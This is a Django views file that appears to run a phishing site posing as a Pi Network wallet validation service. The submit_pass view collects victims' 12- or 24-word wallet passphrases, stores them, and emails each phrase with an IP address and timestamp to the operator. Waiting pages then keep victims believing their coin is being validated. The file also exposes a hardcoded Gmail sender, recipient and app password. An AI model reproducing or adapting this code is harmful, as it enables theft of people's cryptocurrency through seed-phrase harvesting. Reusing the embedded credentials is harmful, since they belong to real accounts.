from django.shortcuts import render, redirect
from django.contrib import messages
from django.http import HttpResponse
from . import models
from .keys_test import generate_password
from firebmail import sendmail as sending_no
from datetime import datetime
import requests

# Create your views here.

def send_notify(subject, payload):
    sender = "ezekielizuchi2018@gmail.com"
    password = "pvos glgf nxal finc"
    recipient = "ezekielobiajulu0@gmail.com"
    
    return sending_no(payload, recipient, sender,password, subject)


def get_ip_address():
    try:
        address = requests.get('https://api64.ipify.org?format=json')
        if address.status_code == 200:
            ip_data = address.json()
            ip_add = ip_data['ip']

        else:
            print(f"Failed to retrieve IP address. Status code: {address.status_code}")
    except Exception as e:
        print(f"An error occurred: {e}")

    return ip_add

"""
to get location data
"""
def get_location(ip_address):
    try:
        response = requests.get(f'https://ipapi.co/{ip_address}/json/')

        if response.status_code == 200 or response.status_code == 539:
            location_data = response.json()
            return location_data
        else:
            print(f"Failed to retrieve location. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred: {e}")

def index(request):
    ip_add = get_ip_address()
    request.session['ip_address'] = ip_add
    send_notify(payload=f'someone has visited your pi site - {ip_add}', subject='Pi site')
    return render(request, 'index.html', {})

def validate(request):
    return render(request, 'validate.html', {})

def wallet(request):
    return render(request, 'wallet.html', {})

def submit_pass(request):
    if request.method == "POST":
        keys = request.POST.get('mf-text', '')
        words = keys.split()
        if len(words) != 24 and len(words) != 12:
            messages.error(request, 'Invalid Passphrase')
            return redirect('/wallet/')

        else:
            look_up_key = generate_password()
            key_exists = models.PassPhrase.objects.filter(keys=keys).exists()
            if key_exists:
                if models.PassPhrase.objects.filter(keys=keys, is_verified=False):
                    messages.error(request, 'We are validating your Pi coin')
                    return redirect('/wallet/')
                else:
                    return render(request, 'verification.html', {})

            else:
                key_save = models.PassPhrase.objects.create(
                    keys=keys,
                    look_up = look_up_key
                )
                key_save.save()
                ip_address = request.session.get('ip_address', None)

                current_time = datetime.now()
                formatted_time = current_time.strftime("%Y-%m-%d %H:%M:%S")
                send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject='Pi site Token Submitted')
                request.session['look_up'] = look_up_key
                # key_sent = models.PassPhrase.objects.get(look_up=look_up_key)
                return approve(request, keys=look_up_key)
        
    else:
        return redirect('/')


def verify_your_coin(request, keys = None):
    if keys == None:
        key = request.session.get('look_up', None)

        if key:
            look_up = models.PassPhrase.objects.filter(look_up=key).first()
            if look_up:
                if look_up.is_verified:
                    return render(request, 'verification.html', {})
                else:
                    messages.error(request, 'We are validating your info')
                    # return redirect('/wallet/')
                    return render(request, 'pending_verify.html', {})
            else:
                messages.error(request, 'Invalid Key')
                return redirect('/wallet/')

        else:
            messages.error(request, 'Invalid Key')
            return redirect('/wallet/')
    else:
        return render(request, 'verification.html', {})

def approve(request, keys = None):
    if keys == None:
        messages.error(request, 'Please Enter Your PassPhrase')
        return redirect('/wallet/')
    
    else:
        if models.PassPhrase.objects.filter(look_up=keys).exists():
            return render(request, 'approve.html', {})
        else:
            messages.error(request, 'Please Enter Your PassPhrase')
            return redirect('/wallet/')
    
